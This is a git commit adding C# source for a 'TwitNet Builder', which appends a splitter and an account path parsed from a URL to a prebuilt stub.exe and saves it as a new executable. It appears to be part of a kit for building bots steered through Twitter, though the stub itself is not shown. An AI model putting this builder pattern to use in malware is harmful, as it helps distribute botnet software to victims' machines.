db9ac4e2e8093ae508e4db499be152ad5f3471ce
jesusspork <ttsjesus@gmail.com>
2010-12-27 01:31:13 -0500

    TwitNet base. Showing how it will work

---
+++ TwitNet Builder/TwitNet Builder/Form1.cs
@@ -0,0 +1,40 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.IO;
+using System.Text.RegularExpressions;
+
+namespace TwitNet_Builder
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            SaveDialog.Filter = "Exe File(*.exe)|*.exe";
+            SaveDialog.InitialDirectory = Application.StartupPath;
+            SaveDialog.Title = "Save As...";
+            SaveDialog.ShowDialog();
+
+            byte[] stub = File.ReadAllBytes("stub.exe");
+
+            string AppendData = Util.Splitter + Regex.Split(textBox1.Text, ".com/")[1];
+            
+            StreamWriter writer = new StreamWriter(SaveDialog.FileName, false, Encoding.Default);
+            writer.AutoFlush = true;
+            writer.Write(Encoding.Default.GetString(stub));
+            writer.Write(AppendData);
+            writer.Close();
+            MessageBox.Show("Completed");
+        }
+    }
+}
---
+++ TwitNet Stub/TwitNet Stub/Util.cs
@@ -0,0 +1,11 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+
+namespace TwitNet_Stub
+{
+    public static class Util
+    {
+        public static string Splitter = "|split|";
+    }
+}
